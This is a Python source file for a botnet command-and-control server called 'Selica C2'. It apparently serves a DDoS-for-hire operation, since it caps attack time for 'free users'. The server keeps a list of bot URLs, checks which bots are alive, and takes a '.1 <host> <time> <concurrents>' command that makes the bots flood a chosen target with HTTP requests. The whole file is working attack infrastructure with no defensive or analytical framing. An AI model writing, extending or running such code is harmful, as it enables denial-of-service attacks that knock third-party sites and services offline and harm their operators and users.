import asyncio
import time
import requests
import random
from threading import Thread
from datetime import datetime
from pystyle import Center, Box

terminal = "\u001b[32mselica@user:~$ \u001b[0m"

bots = []
enable = True
connected = []

class bcolors:
    HEADER = b'\033[95m'
    OKBLUE = b'\033[94m'
    OKCYAN = b'\033[96m'
    OKGREEN = b'\033[92m'
    WARNING = b'\033[93m'
    FAIL = '\033[91m'
    ENDC = b'\033[0m'
    BOLD = b'\033[1m'
    UNDERLINE = b'\033[4m'


class EchoServerProtocol(asyncio.Protocol):
    global terminal
    global bots
    global connected
    def connection_made(self, transport):
        peername = transport.get_extra_info('peername')
        print('new connection: {}'.format(peername))
        self.transport = transport
        for x in range(100):
                self.send_message(f"\n\r")
        self.set_title(f"Selica C2 | Total bots: {str(len(bots))} | @io_ping")
        hello = u'\u001b[36mWelcome to the \u001b[34mSelica C2\u001b[0m\n\r'
        self.transport.write(bytes(hello, encoding = 'utf-8') + bytes(terminal, encoding = 'utf-8'))

    def set_title(self, title):
        self.transport.write(b"\x1b]0;" + bytes(title, encoding = 'utf-8') + b"\x07")

    def send_request(self, url, data, timeout):
        try:
            requests.post(url, data=data, timeout=timeout)
        except:
            pass


    def get_ip(self):
        peername = self.transport.get_extra_info('peername')
        ip = str(peername).split("',")[0].replace("(", '').replace("'", '')
        return ip

    def attack(self, method, host, time, concs):
        if method == 1:
            global bots
            try:
                concs = int(concs)
                for x in range(concs):
                    bot = random.choice(bots)
                    try:
                        data = {"method":'1', 
                        "host":host, 
                        "time":time}
                        Thread(target=self.send_request, args=(bot, data, 1,)).start()
                    except Exception as e:
                        print(e)
            except:
                for bot in bots:
                    try:
                        data = {"method":'1', 
                        "host":host, 
                        "time":time}
                        Thread(target=self.send_request, args=(bot, data, 1,)).start()
                    except Exception as e:
                        print(e)


    def send_message(self, message):
        self.transport.write(bytes(message, encoding = 'utf-8'))


    def get_bots(self):
        global bots
        bots = []
        list_bots = open("bots.txt").read().splitlines()
        for bot in list_bots:
            try:
                r = requests.get(bot + "?ping=qwe", timeout=1)
                if "pong" in r.text:
                    bots.append(bot)
                    self.set_title(f"Selica C2 | Total bots: {str(len(bots))} | @io_ping")
            except Exception as e:
                print(e)
        


    def data_received(self, data):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        cmd = data.decode().replace("\n", '').replace("\r", '').lower()
        if cmd != "":
            print(f"[{current_time}] {self.get_ip()}: " + cmd)
            if cmd == "clear":
                for x in range(100):
                    self.send_message(f"\n\r")
                self.send_message(terminal)

            elif cmd == "bots":
                Thread(target=self.get_bots).start()
                self.send_message("All bots has been refreshed\n\r")
                self.send_message(terminal)

            elif cmd == "help":
                for x in range(100):
                    self.send_message(f"\n\r")
                self.send_message(terminal)


            elif cmd.startswith(".1 "):
                try:
                    cmd = cmd.replace(".1 ", '')
                    host = cmd.split(" ")[0]
                    time = int(cmd.split(" ")[1])
                    concs = cmd.split(" ")[2]
                    if time > 100:
                        self.send_message(bcolors.FAIL + f"[x] Max attack time for free users - 100 seconds.\n\r")
                        self.send_message(terminal)
                    else:
                        Thread(target=self.attack, args=(1, host, time, concs,)).start()
                        self.send_message(f"\n\r\033[94m    Attack started!\n\r    Using method: HTTP-RAW\n\r    Target host: {host}\n\r    Attack time: {str(time)}\n\r    Concurrents: {concs}\n\n\r")
                        self.send_message(terminal)
                except Exception as e:
                    print(e)
                    self.send_message(bcolors.FAIL + "[x] HTTP-RAW | Usage: .1 <host> <time(in seconds)> <concurrents>\n\r")
                    self.send_message(terminal)

            else:
                self.send_message(bcolors.FAIL + "Wrong command. Type 'help' for get help\n\r")
                self.send_message(terminal)
            
            



async def main():
    # Get a reference to the event loop as we plan to use
    # low-level APIs.
    loop = asyncio.get_running_loop()

    server = await loop.create_server(
        lambda: EchoServerProtocol(),
        '127.0.0.1', 8888)
    print(Center.XCenter(Box.DoubleCube("Selica C2 | Server Started")))
    list_bots = open("bots.txt").read().splitlines()
    for bot in list_bots:
        bots.append(bot)
    

    async with server:
        await server.serve_forever()
asyncio.run(main())
